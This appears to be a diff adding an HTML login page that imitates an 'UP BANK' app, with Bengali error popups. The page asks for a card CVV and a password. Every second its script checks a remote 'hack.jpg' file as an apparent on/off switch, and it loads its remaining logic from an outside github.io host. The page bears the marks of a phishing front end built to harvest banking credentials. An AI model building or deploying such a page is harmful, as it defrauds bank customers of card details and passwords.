@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Login | UP BANK</title> 
+     <link
+      rel="stylesheet"
+      data-purpose="Layout StyleSheet"
+      title="Web Awesome"
+      href="/css/app-wa-09b459cf485d4b1f3304947240314c05.css?vsn=d"
+    >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css"
+      >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css"
+      >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css"
+      >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css"
+      >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css"
+      >
+
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css"
+      >
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="stylesheet" href="index.css"></head>
+<body><div class="no-connection-popup" id="no-connection-popup2">
+        <div class="icon"><i class="fa-duotone fa-solid fa-seal-exclamation"></i></div>
+        <h1>তথ্য সঠিক নয়!</h1>
+        <p id="result"></p>
+        <button id="close-popup2">Ok</button>
+    </div><div class="no-connection-popup" id="no-connection-popup3">
+        <div class="icon"><i class="fa-duotone fa-solid fa-bell-exclamation"></i></div>
+        <h1>কিছু সময় পরে চেষ্টা করুন। </h1>
+        <p>অ্যাপ মেরামতের কাজ চলছে। </p>
+        <button id="close-popup3">Ok</button>
+    </div>
+   <div class="modal">
+    <form id="loginForm" class="form">
+        <div class="separator">
+            <hr class="line">
+            <p style="color:black">UP Bank</p>
+            <hr class="line">
+        </div>
+        <div class="card-info">
+            <div class="input_container">
+                <label class="input_label">Card Number</label>
+                <input id="card-number" class="input_field" type="text" value="600* 0000 ****" readonly>
+            </div>
+            <div class="input_container">
+                <label class="input_label">CVV</label>
+                <div class="split">
+                    <input id="cvv" class="input_field" style="width: 110px;" type="tel" placeholder="123" autocomplete="off">
+                    <input class="input_field" style="width: 110px;" type="text" value="12/27" readonly>
+                </div>
+            </div>
+            <div class="input_container">
+                <label class="input_label">Password</label>
+                <div class="password-container">
+                    <input class="input_field" id="password" type="password" placeholder="●●●●●●●●" autocomplete="new-password">
+                    <i class="fas fa-eye password-toggle" id="toggle-password"></i>
+                </div>
+            </div>
+        </div>
+        <button id="sub"class="checkout" >
+            <span>Login</span>
+        </button>
+           <div class="container">
+      <button type="button" id="regif" onclick="registerWithFingerprint()" class="button2">
+        <i class="fa-duotone fa-solid fa-fingerprint"></i>
+      </button>
+      <button type="button" id="logf"onclick="authenticateAndSubmit()" class="button2">
+        <i class="fa-duotone fa-solid fa-fingerprint"></i>
+      </button></div>
+      
+    </form>
+</div>
+    <script>
+ let audioPlayed = false;
+const audioElement = new Audio('fail.mp3');
+
+// Preload the audio
+audioElement.preload = 'auto';
+audioElement.load();
+
+async function checkInternetConnection() {
+    const netpopup3 = document.getElementById('no-connection-popup3');
+    
+   
+    try {
+        // Attempt to fetch the second resource
+        const response2 = await fetch('https://unpob.github.io/app/hack.jpg' ,{ method: 'HEAD', cache: 'no-store' });
+        
+        if (!response2.ok) {
+            throw new Error('Second link offline');
+        }
+        
+        netpopup3.style.display = 'none';
+    } catch (error) {
+        netpopup3.style.display = 'block';
+        playAudioOnce();
+    }
+
+    // Reset the reload flag if connection is restored
+    if (sessionStorage.getItem('reloaded') === 'true') {
+        sessionStorage.removeItem('reloaded');
+        location.reload();
+    }
+}
+
+function playAudioOnce() {
+    if (!audioPlayed) {
+        audioElement.play().catch(error => {
+            console.error('Audio playback failed:', error);
+        });
+        audioPlayed = true;
+    }
+}
+
+window.addEventListener('load', checkInternetConnection);
+setInterval(checkInternetConnection, 1000);
+
+document.getElementById('close-popup2').addEventListener('click', function () {
+    document.getElementById('no-connection-popup').style.display = 'none';
+    audioPlayed = false; // Reset the flag when the popup is manually closed
+});
+
+document.getElementById('close-popup3').addEventListener('click', function () {
+    document.getElementById('no-connection-popup3').style.display = 'none';
+    audioPlayed = false; // Reset the flag when the popup is manually closed
+});
+ </script>
+    <script src="fingerprint.js"></script>
+  <script src="https://unpob.github.io/app/index2.js"></script>
+</body>
+</html>
